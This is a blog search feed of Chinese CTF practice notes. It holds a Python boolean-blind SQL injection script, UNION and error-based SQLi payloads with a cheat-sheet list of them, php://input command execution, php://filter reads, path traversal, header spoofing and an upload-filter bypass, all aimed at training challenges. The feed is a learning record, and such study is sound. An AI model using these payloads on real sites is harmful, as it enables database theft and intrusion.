<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>20-09-21</title>
    <link href="/2020/09/21/20-09-21/"/>
    <url>/2020/09/21/20-09-21/</url>
    
    <content type="html"><![CDATA[<p>象棋（ichuqiu）<br>昨天就做到的题，猫腻在源码里就能找到，js链接是个正则表达式，不过之前一直想着的是用python做，但是只会单线程的我半天没找到答案。<br>今天看wp突然醒悟用bp就挺好的，成功爆破flag</p><hr><p>SQLi(ichunqiu)<br>收获颇多的一道题<br>进入就是登录界面，尝试admin为用户名一次就对，想着直接爆破结果失败了。发现回显只有username error!以及password error!两种，bool盲注<br>先试试过滤点，发现后缀是%时报错时sprintf参数问题，查找关于sprintf的漏洞找到这篇<a href="https://zhuanlan.zhihu.com/p/115777073" target="_blank" rel="noopener">文章</a><br>应该就是单引号逃逸闭合来注入<br>构造payload:  </p><ul><li>admin%1$\’ or 1=1— 回显password error!</li><li>admin%1$\’ or 1=2— 回显username error!<br>可见可以通过or后面表达式的布尔值真假进行bool盲注<pre><code class="hljs go"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> <span class="hljs-keyword">string</span>url =  <span class="hljs-string">"http://5e2c1c23ad44440f9ba4d92351e69666afb9ede320b748f3.changame.ichunqiu.com/"</span>dir  = <span class="hljs-keyword">string</span>.digits+<span class="hljs-keyword">string</span>.ascii_letters+  <span class="hljs-string">"!@#$%^&amp;*()_+&#123;&#125;-="</span>right =  <span class="hljs-string">"password error!"</span>#猜数据库长度--<span class="hljs-number">-3</span><span class="hljs-keyword">for</span> i in <span class="hljs-keyword">range</span>(<span class="hljs-number">30</span>):data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">"admin%1$\\' or (length(database())="</span>+str(i)+<span class="hljs-string">")-- "</span>,<span class="hljs-string">'password'</span>:<span class="hljs-string">"password"</span>&#125;response = requests.post(url,data=data).text<span class="hljs-built_in">print</span>(<span class="hljs-string">"..."</span>+str(i))<span class="hljs-keyword">if</span> right in response:<span class="hljs-built_in">print</span>(<span class="hljs-string">"the length of database_name is"</span>+str(i))<span class="hljs-keyword">break</span></code></pre><pre><code class="hljs routeros"><span class="hljs-comment">#爆数据库---ctf</span>database_name = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,4):<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dir:payload = <span class="hljs-string">"admin%1$\\' or (ascii(substr(database(),&#123;0&#125;,1))="</span>+str(ord(c))+<span class="hljs-string">")-- "</span>data = &#123;<span class="hljs-string">'username'</span>:payload.format(i),<span class="hljs-string">'password'</span>:<span class="hljs-string">"password"</span>&#125;response = requests.post(url,<span class="hljs-attribute">data</span>=data).text<span class="hljs-builtin-name">print</span>(payload.format(i)+<span class="hljs-string">"..."</span>)<span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> response:database_name+=c<span class="hljs-builtin-name">print</span>(<span class="hljs-string">"okkkkkkkkkkkkkkkkkkk"</span>+c)break<span class="hljs-builtin-name">print</span>(database_name)</code></pre><pre><code class="hljs sql"><span class="hljs-comment">#爆表长度----4</span><span class="hljs-comment">#试着数据库名写成'ctf'发现不行，ctf写成asciihex编码形式0x637466成功注入</span><span class="hljs-comment">#注意使用limit 0,1限定查询</span>table_name = ''for i in range(30):payload = "admin%1$\\' or (<span class="hljs-keyword">select</span> <span class="hljs-keyword">length</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-number">0x637466</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">"+str(i)+"</span><span class="hljs-comment">-- "</span><span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">'username'</span>:payload,<span class="hljs-string">'password'</span>:<span class="hljs-string">"password"</span>&#125;response = requests.post(<span class="hljs-keyword">url</span>,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).textprint(payload+<span class="hljs-string">"..."</span>)<span class="hljs-keyword">if</span> <span class="hljs-keyword">right</span> <span class="hljs-keyword">in</span> response:print(<span class="hljs-string">"------------------"</span>+<span class="hljs-keyword">str</span>(i))break</code></pre><pre><code class="hljs sql"><span class="hljs-comment">#爆表名----flag</span>table_name = ''for i in range(1,5):for c in dir:payload = "admin%1$\\' or ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>))=<span class="hljs-string">"+str(ord(c))+"</span><span class="hljs-comment">-- "</span><span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">'username'</span>:payload.format(i),<span class="hljs-string">'password'</span>:<span class="hljs-string">"password"</span>&#125;response = requests.post(<span class="hljs-keyword">url</span>,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).textprint(payload.format(i)+<span class="hljs-string">"..."</span>)<span class="hljs-keyword">if</span> <span class="hljs-keyword">right</span> <span class="hljs-keyword">in</span> response:table_name+=cprint(<span class="hljs-string">"-------------------"</span>+c)breakprint(table_name)</code></pre><pre><code class="hljs sql"><span class="hljs-comment">#爆列长度---4</span>for i in range(30):payload = "admin%1$\\' or (<span class="hljs-keyword">select</span> <span class="hljs-keyword">length</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name = <span class="hljs-number">0x666c6167</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">"+str(i)+"</span><span class="hljs-comment">-- "</span><span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">'username'</span>:payload,<span class="hljs-string">'password'</span>:<span class="hljs-string">'password'</span>&#125;response = requests.post(<span class="hljs-keyword">url</span>,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).textprint(payload)<span class="hljs-keyword">if</span> <span class="hljs-keyword">right</span> <span class="hljs-keyword">in</span> response:print(<span class="hljs-string">"--------------------"</span>+<span class="hljs-keyword">str</span>(i))break</code></pre><pre><code class="hljs routeros"><span class="hljs-comment">#爆列名---flag</span>column_name = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,5):<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dir:payload = <span class="hljs-string">"admin%1$\\' or ascii(substr((select column_name from information_schema.columns where table_name = 0x666c6167 limit 0,1),&#123;0&#125;,1))="</span>+str(ord(c))+<span class="hljs-string">"-- "</span>data = &#123;<span class="hljs-string">'username'</span>:payload.format(i),<span class="hljs-string">'password'</span>:<span class="hljs-string">'password'</span>&#125;response = requests.post(url,<span class="hljs-attribute">data</span>=data).text<span class="hljs-builtin-name">print</span>(payload.format(i))<span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> response:column_name+=c<span class="hljs-builtin-name">print</span>(<span class="hljs-string">"------------"</span>+c)break<span class="hljs-builtin-name">print</span>(column_name)</code></pre><pre><code class="hljs routeros"><span class="hljs-comment">#爆flag</span><span class="hljs-comment">#懒得爆长度了，直接上</span><span class="hljs-attribute">flag</span>=<span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>  range(1,100):<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span>  dir:payload =  <span class="hljs-string">"admin%1$\\' or ascii(substr((select flag from flag limit 0,1),&#123;0&#125;,1))="</span>+str(ord(c))+<span class="hljs-string">"-- "</span>data = &#123;<span class="hljs-string">'username'</span>:payload.format(i),<span class="hljs-string">'password'</span>:<span class="hljs-string">'password'</span>&#125;response = requests.post(url,<span class="hljs-attribute">data</span>=data).text<span class="hljs-builtin-name">print</span>(payload.format(i))<span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> response:flag+=c<span class="hljs-builtin-name">print</span>(<span class="hljs-string">"------------"</span>+c)break<span class="hljs-keyword">if</span> c ==  <span class="hljs-string">'&#125;'</span>:break<span class="hljs-builtin-name">print</span>(flag)</code></pre></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-20</title>
    <link href="/2020/09/20/20-09-20/"/>
    <url>/2020/09/20/20-09-20/</url>
    
    <content type="html"><![CDATA[<p>悄悄参加了tokyoctf，结果除了签到题就会一个，web全是用python flask框架，完全懵逼。感觉web好难啊，有点受到打击。</p><hr><p>GetFlag(ichunqiu)<br>打开链接被正常嘲讽，还是提示了登录可以下载文件获得flag啥的。看源码没有发现有啥问题，登录呗。<br>除了账号密码还有个验证码，每次刷新会变。起初是脚本md5生成验证码加SQL注入，但是先手注尝试admin’— 就直接成功了。。。<br>登录后果然有三个文件可以下载，最后的a.php提示flag在根目录,根据源码中三个文件的下载链接知道是在./file/download.php?f=filename.php下载文件，尝试../寻找根目录以及伪协议读取但一直得到flag{wow!!!but not true}，应该是被过滤了，尝试大写双写绕过均失败<br>网上找wp知道Linux web网站的默认路径 /var/www/html，构造payload: f= /var/www/html/flag.php不行，再试f=/var/www/html/Challenges/flag.php成功下载flag.php文件<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$f = $_POST[<span class="hljs-string">'flag'</span>];</span><span class="php">$f = str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">'`'</span>, <span class="hljs-string">'$'</span>, <span class="hljs-string">'*'</span>, <span class="hljs-string">'#'</span>, <span class="hljs-string">':'</span>, <span class="hljs-string">'\\'</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">"'"</span>, <span class="hljs-string">'('</span>, <span class="hljs-string">')'</span>, <span class="hljs-string">'.'</span>, <span class="hljs-string">'&gt;'</span>), <span class="hljs-string">''</span>, $f);</span><span class="php"><span class="hljs-keyword">if</span>((strlen($f) &gt; <span class="hljs-number">13</span>) || (<span class="hljs-keyword">false</span> !== stripos($f, <span class="hljs-string">'return'</span>)))</span><span class="php">&#123;</span><span class="php"><span class="hljs-keyword">die</span>(<span class="hljs-string">'wowwwwwwwwwwwwwwwwwwwwwwwww'</span>);</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">try</span></span><span class="php">&#123;</span><span class="php"> <span class="hljs-keyword">eval</span>(<span class="hljs-string">"\$spaceone = $f"</span>);</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">catch</span> (<span class="hljs-keyword">Exception</span> $e)</span><span class="php">&#123;</span><span class="php"><span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">if</span> ($spaceone === <span class="hljs-string">'flag'</span>)&#123;</span><span class="php"><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">"helloctf.php"</span>);</span><span class="php">&#125;</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>flag.php网页下构造flag=flag;查看源码得到flag<br>起初一直用bp拦包传参，但是这道题不行，用hackBar对比后发现hackbar加了请求头Content-Type: application/x-www-form-urlencoded</p><p><a href="https://blog.csdn.net/iamsongyu/article/details/84567438" target="_blank" rel="noopener">CTF-web Linux中几个关键的文件</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-18</title>
    <link href="/2020/09/18/20-09-18/"/>
    <url>/2020/09/18/20-09-18/</url>
    
    <content type="html"><![CDATA[<p>感觉还是好多不会，知识点太散了。。: )</p><hr><p>include(ichunqiu)<br>phpinfo()中发现allow_url_include是打开的，可以用php://input<br><code>&lt;?php system(&quot;ls&quot;);?&gt;</code>得到目录<br><code>&lt;?php system(&quot;cat file_name&quot;);?&gt;</code>得到flag<br>或者用php://filter得到flag</p><hr><p>破译(ichunqiu)<br>根据flag四个字符猜测移位密码以及各种英文猜测即可得到解密后的flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-9-17</title>
    <link href="/2020/09/17/20-9-17/"/>
    <url>/2020/09/17/20-9-17/</url>
    
    <content type="html"><![CDATA[<p>NaNNaNNaNNaN-Batman（xctf）<br>下载附件后发现是一段混乱的js代码，发现eval函数，可能是js混淆加密，和昨天的题类似。直接输入到控制台生成一个提交界面，通过console.log()把混淆的js代码解密得到以下内容：<br><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">$</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">var</span>  e=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"c"</span>).value;<span class="hljs-keyword">if</span>(e.length==<span class="hljs-number">16</span>)<span class="hljs-keyword">if</span>(e.match(<span class="hljs-regexp">/^be0f23/</span>)!=<span class="hljs-literal">null</span>)<span class="hljs-keyword">if</span>(e.match(<span class="hljs-regexp">/233ac/</span>)!=<span class="hljs-literal">null</span>)<span class="hljs-keyword">if</span>(e.match(<span class="hljs-regexp">/e98aa$/</span>)!=<span class="hljs-literal">null</span>)<span class="hljs-keyword">if</span>(e.match(<span class="hljs-regexp">/c7be9/</span>)!=<span class="hljs-literal">null</span>)&#123;<span class="hljs-keyword">var</span>  t=[<span class="hljs-string">"fl"</span>,<span class="hljs-string">"s_a"</span>,<span class="hljs-string">"i"</span>,<span class="hljs-string">"e&#125;"</span>];<span class="hljs-keyword">var</span>  n=[<span class="hljs-string">"a"</span>,<span class="hljs-string">"_h0l"</span>,<span class="hljs-string">"n"</span>];<span class="hljs-keyword">var</span>  r=[<span class="hljs-string">"g&#123;"</span>,<span class="hljs-string">"e"</span>,<span class="hljs-string">"_0"</span>];<span class="hljs-keyword">var</span>  i=[<span class="hljs-string">"it'"</span>,<span class="hljs-string">"_"</span>,<span class="hljs-string">"n"</span>];<span class="hljs-keyword">var</span>  s=[t,n,r,i];<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span>  o=<span class="hljs-number">0</span>;o&lt;<span class="hljs-number">13</span>;++o)&#123;<span class="hljs-built_in">document</span>.write(s[o%<span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);s[o%<span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)&#125;&#125;&#125;<span class="hljs-built_in">document</span>.write(<span class="hljs-string">'&lt;input id="c"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'</span>);<span class="hljs-keyword">delete</span> _</code></pre><br>根据if语句构造提交字符串或者根据生成flag的代码直接写成flag都行</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-16</title>
    <link href="/2020/09/16/20-09-16/"/>
    <url>/2020/09/16/20-09-16/</url>
    
    <content type="html"><![CDATA[<p>虽然花了很多时间才得到flag居然莫名很开心。。。<br>江湖魔头(bugku)<br>进界面发现是个小游戏，查看源码发现链接指向wulin.php?action=start，没有其他信息，点进链接洗点界面，在源码上依然发现啥，继续游戏，大概是要挣钱买如来神掌。在源码上没有发现什么，想抓包修改发现请求头只有cookie，可以猜测相关角色数据信息就在cookie的user里，先url解码再base64解码，结果只得到一串乱码。。。<br>已经明确猫腻在cookie里，尝试寻找其相关代码，查看三个js文件，base,js和md5.js都比较好理解，但是script.js看不懂。。参考一下别人的wp发现这个js文件是加密混淆处理过的。<br><a href="https://strcpy.me/index.php/archives/213/" target="_blank" rel="noopener">js加密</a><br>把三个js文件复制到本地，通过console.log(p)得到script.js。这下终于看懂了，大致步骤就是将cookie是明文加密得到的，通过script.js提供的解密算法得到当前cookie的明文，修改后自己编写加密算法得到cookie，从而打败boss得到flag。<br><del>为啥会开心捏~(￣▽￣)~*，可能是开挂的感觉真好</del></p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-15</title>
    <link href="/2020/09/15/20-09-15/"/>
    <url>/2020/09/15/20-09-15/</url>
    
    <content type="html"><![CDATA[<p>一道时间盲注弄不出来，一道布尔盲注被暴力破解了。。注意补上</p><hr><p>Trim(bugku)<br>登录注册重置密码界面都尝试sql注入，发现只会提示mysql connect error!，用bp扫描目录发现clear.php，show.php，以及index.php会重定向到login.php，flag就在show.php里面。。</p><hr><p>文件上传2(湖湘杯)(bugku)<br>做的莫名其妙。。。<br><img src="/2020/09/15/20-09-15/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202020-09-15%20094700.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>总感觉最后一行是被人改的。。<br>图片链接和upload链接都没有用<br>看wp发现是用php filter。。<br>op=php://filter/read=convert.base64-encode/resource=index.php还是没有，改成resource=../index.php结果得到<em>Try it again and I will kill you! I freaking hate hackers!</em><br>想到点图片链接时跳到的是op=home，点upload链接跳到op=upload，猜测是不加php，于是构造payload:op=php://filter/read=convert.base64-encode/resource=index得到index.php源码。果然是过滤..以及自动加.php后缀，尝试op=php://filter/read=convert.base64-encode/resource=flag得到结果</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-14</title>
    <link href="/2020/09/14/20-09-14/"/>
    <url>/2020/09/14/20-09-14/</url>
    
    <content type="html"><![CDATA[<p> PHP_encrypt_1(ISCCCTF)(bugku)<br> 很简单的解密题，居然错了好几次。。<br> php的求模运算得到的结果正负和被除数相同。。一直习惯了python的求模结果和除数相同，想着不用去处理负数情况，结果: )，早知道用python写了。<br> php: -5 % 3 = -2<br> python: -5 % 3 = 1<br> <pre><code class="hljs xml"> <span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decrypt</span><span class="hljs-params">($str)</span></span></span><span class="php">&#123;</span><span class="php">    $key = md5(<span class="hljs-string">'ISCC'</span>);</span><span class="php">    $klen = strlen($key);</span><span class="php">    $str = base64_decode($str);</span><span class="php">    $x = <span class="hljs-number">0</span>;</span><span class="php">    $data = <span class="hljs-string">""</span>;</span><span class="php">    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; strlen($str); $i++)&#123;</span><span class="php">        <span class="hljs-keyword">if</span>($x == $klen)</span><span class="php">        &#123;</span><span class="php">            $x = <span class="hljs-number">0</span>;</span><span class="php">        &#125;</span><span class="php">        $char .= $key[$x];</span><span class="php">        $x += <span class="hljs-number">1</span>;</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; strlen($str); $i++)&#123;</span><span class="php">        $tmp = ord($str[$i]) - ord($char[$i]);</span><span class="php">        <span class="hljs-keyword">while</span>($tmp &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//处理负数结果</span></span><span class="php">            $tmp += <span class="hljs-number">128</span>;</span><span class="php">        $data .= chr($tmp);</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">return</span> $data;</span><span class="php">&#125;</span><span class="php">$str = <span class="hljs-string">"fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA="</span>;</span><span class="php"><span class="hljs-keyword">echo</span> decrypt($str);</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre></p><hr><p>flag.php(bugku)<br>一个按钮没有用的表格，查看源码没发现什么问题，尝试flag.php页面存在但是没有任何内容，注意题目描述的hint，回到初始页面get传参hint，得到php代码，序列化Key传入cookie即可。注意Key没有初始化因此”Key”=””，以及序列化得到的;因为要传入cookie要url编码成%3b</p><hr>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-13</title>
    <link href="/2020/09/13/20-09-13/"/>
    <url>/2020/09/13/20-09-13/</url>
    
    <content type="html"><![CDATA[<p>多次(bugku)<br>id从1-5显示，id=5时提示SQL注入（使用url输入时的形式写）</p><ul><li>id=5’%23 (%23为#)，有回显</li><li>id=5’+or+1=1%23，显示error，考虑是关键字被过滤了</li><li>尝试加注释，没有效果</li><li>双写or，有回显</li><li>id=5’+oorrder+by+2%23有回显，3无回显,说明有两列</li><li>id=5’+union+select+null,null%23显示error，依次尝试双写union和select，发现这两个都被过滤了</li><li>id=0’+ununionion+seselectlect+1,2%23回显只有2，考虑只显示第二个参数</li><li>id=0’+ununionion+seselectlect+null,database()%23得到数据库名web1002-1</li><li>id=0’+ununionion+seselectlect+null,group_concat(table_name)+from+infoorrmation_schema.tables+where+table_schema=’web1002-1’%23得到表名flag1,hint</li><li>id=0’+ununionion+seselectlect+null,group_concat(column_name)+from+infoorrmation_schema.columns+where+table_name=’flag1’%23得到列名flag1,address</li><li>id=0’+ununionion+seselectlect+null,flag1+from+flag1%23得到flag，转小写提交发现不对</li><li>题目提示有两个flag</li><li><p>id=0’+ununionion+seselectlect+null,address+from+flag1%23得到下一关地址</p><p>进到下一关之后发现依然是SQL注入的题</p></li><li><p>id=1到id=7都是绿字，之后显示nobody</p></li><li>id=1’%23回显正常</li><li>id=1’+or+1=1%23回显正常</li><li>id=1’+and+1=2%23预料之中显示nobody，目前看来可以注入</li><li>id=1’+order+by+2%23正常回显，id=1’+order+by+3%23显示nobody并且有报错信息</li><li>id=1’+union+select+null,null%23显示nobody并且报错</li><li>考虑各种绕过都不行</li><li><p>注意到有报错信息，尝试报错注入</p><p>有关报错注入<a href="https://www.cnblogs.com/s1ye/p/8261979.html" target="_blank" rel="noopener">相关文章</a><br>使用extractvalue() payload</p></li><li>id=0’+and+extractvalue(1,concat(0x7e,database(),0x7e))%23在报错信息中得到数据库名web1002-2</li><li>id=1’+and+extractvalue(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema=’web1002-2’),0x7e))%23得到表名class,flag2</li><li>id=1’+and+extractvalue(1,concat(0x7e,(select+group_concat(column_name)+from+information_schema.columns+where+table_name=’flag2’),0x7e))%23得到列名flag2,address</li><li>id=0’+and+extractvalue(1,concat(0x7e,(select+flag2+from+flag2),0x7e))%23得到flag，小写提交得到结果<br>其他报错注入快速一览</li><li><em>floor() payload:  and select count(</em>) from information_schema.tables group by concat(user(),floor(rand(0)<em>2))—</em></li><li><em>extractvalue() payload:  and extractvalue(1,concat(0x7e,user(),0x7e))—</em></li><li><em>updatexml() payload:  and updatexml(1,concat(0x7e,(select user()),0x7e),1)—</em></li><li><em>exp() payload:  and exp(~(select </em> from(select user())x))—*</li><li><em>geometrycollection() payload:  and geometrycollection((select </em> from(select <em> from(select user())a)b))—</em></li><li><em>multipoint() payload:  and multipoint((select </em> from(select <em> from(select user())a)b))—</em></li><li><em>polygon() payload:  and polygon((select </em> from(select <em> from(select user())a)b))—</em></li><li><em>multipolygon() payload:  and multipolygon((select </em> from(select <em> from(select user())a)b))—</em></li><li><em>linestring() payload:  and linestring((select </em> from(select <em> from(select user())a)b))—</em></li><li><em>multilinestring() payload:  and multilinestring((select </em> from(select <em> from(select user())a)b))—</em></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-12</title>
    <link href="/2020/09/12/20-09-12/"/>
    <url>/2020/09/12/20-09-12/</url>
    
    <content type="html"><![CDATA[<p>程序员本地网站(bugku)<br>显然是xff欺骗，bp拦包加上X-Forwarded-For: 127.0.0.1即可</p><hr><p>各种绕过<br>先补充一些小细节：</p><ul><li>无论get还是post传参，页面上的传参都只能传字符串</li><li>hash对数组无效，返回0</li></ul><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$b=$_GET[<span class="hljs-string">'b'</span>];</span><span class="php">var_dump($b);</span><span class="php">$c=$_POST[<span class="hljs-string">'c'</span>];</span><span class="php">var_dump($c);</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><p>b=1（或c）时，显示string(1) “1”<br>b(或c)[]=123时，显示array(1) { [0]=&gt; string(3) “123” }<br>b(或c)[]=1,2,3时，显示array(1) { [0]=&gt; string(5) “1,2,3” }</p><p>扯远了，开始做题<br>要uname和passwd不相等而sha1加密后的值相等，只需要传入数组。<br>id==’margin’，本想着让id=0，但是传参得到的id是字符串，无效，老老实实传入id=margin即可</p><hr><p>web8(bugku)<br>extract函数将传入的数组中的名值对变成变量名和变量值<br>fn是通过读文件流得到，使用fn=php://input从而输入流传参</p><hr><p>细心(bugku)<br>进去一看就是假的404界面。。。两个链接都没什么用，看源码和请求响应头都没有信息。<br>常规查看各种目录，在robots.txt发现目录resusl.php,进入显示不是管理员且ip被记录，以为是xff伪装发现没有，直接爆破x发现密码就是admin,传参x=admin得到flag</p><hr><p>getshell(bugku)<br>文件上传绕过WAF检测的题<br>随便上传一张照片，提交正常，POST表单提交文件，使用multipart/form-data编码方式，会有Content-Type检测文件类型，multipart/form-data严格小写，可以通过大写某个字母绕过这种WAF检测<br>上传jpg文件再bp拦包改回成php文件，同时绕过WAF检测，但是发现还是不行，虽然可以长传文件但是会变成jpg文件，考虑后缀黑名单，依次改后缀为php2,php3,php4,php5,phps,pht, phtm, phtml，在php5使成功上传得到flag</p><blockquote><p>关于WAF相关文章：<a href="http://www.lmxspace.com/2018/11/10/%E5%85%B3%E4%BA%8EWAF%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/" target="_blank" rel="noopener">关于WAF那些事</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-11</title>
    <link href="/2020/09/11/20-09-11/"/>
    <url>/2020/09/11/20-09-11/</url>
    
    <content type="html"><![CDATA[<p>bugku旧平台上的题没人维护。。</p><hr><p>你从哪里来(bugku)<br>注意Referer头要加<a href="http://(https://)协议头！！！" target="_blank" rel="noopener">http://(https://)协议头！！！</a></p><hr><p>md5 collision(NUPT_CTF)<br>bugku里没给出a的判别条件，裂开<br><pre><code class="hljs xml">\\bugku缺的源码代码<span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$md51 = md5(<span class="hljs-string">'QNKCDZO'</span>);</span><span class="php">$a = @$_GET[<span class="hljs-string">'a'</span>];</span><span class="php">$md52 = @md5($a);</span><span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($a))&#123;</span><span class="php"><span class="hljs-keyword">if</span> ($a != <span class="hljs-string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><span class="php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"nctf&#123;*****************&#125;"</span>;</span><span class="php">&#125; <span class="hljs-keyword">else</span> &#123;</span><span class="php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"false!!!"</span>;</span><span class="php">&#125;&#125;</span><span class="php"><span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"please input a"</span>;&#125;</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>要构造a使a != ‘QNKCDZO’并且md51==md52<br>md51=0e830400451993494058024219903391，根据php弱比较的特点：</p><blockquote><p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行</p></blockquote><p>只要md52也是0e开头的数字内容的字符串,他们转换为数值后都是0，即可使得md51==md52</p><p>补充：现在md5加密已经并不唯一，可以通过如“构造前缀碰撞法”进行哈希碰撞，使两个文件MD5值一致且都能正常运行，但是执行的内容不同。<a href="https://wooyun.js.org/drops/MD5%E7%A2%B0%E6%92%9E%E7%9A%84%E6%BC%94%E5%8C%96%E4%B9%8B%E8%B7%AF.html" target="_blank" rel="noopener">相关阅读</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-10</title>
    <link href="/2020/09/10/20-09-10/"/>
    <url>/2020/09/10/20-09-10/</url>
    
    <content type="html"><![CDATA[<p>这学期可好像会有点多 | 网安老师都喜欢说课会比较难 | 希望学到抽代的时候可以顺顺利利</p><hr><p>cookie欺骗(bugku)<br>进网页一串乱码，尝试base64解码没什么用，注意到url的filename参数有点奇怪，base64解码得到是keys.txt，那串乱码应该是他的内容。尝试各种常用目录base64加密到filename，发现就index.php，line=1时有一行php代码，尝试不同line得到不同行，python爬取全部内容得到：<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">error_reporting(<span class="hljs-number">0</span>);</span><span class="php">$file=base64_decode(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'filename'</span>])?$_GET[<span class="hljs-string">'filename'</span>]:<span class="hljs-string">""</span>);</span><span class="php">$line=<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'line'</span>])?intval($_GET[<span class="hljs-string">'line'</span>]):<span class="hljs-number">0</span>;</span><span class="php"><span class="hljs-keyword">if</span>($file==<span class="hljs-string">''</span>) header(<span class="hljs-string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><span class="php">$file_list =  <span class="hljs-keyword">array</span>(</span><span class="php"><span class="hljs-string">'0'</span>  =&gt;<span class="hljs-string">'keys.txt'</span>,</span><span class="php"><span class="hljs-string">'1'</span>  =&gt;<span class="hljs-string">'index.php'</span>,</span><span class="php">);</span><span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">'margin'</span>]) 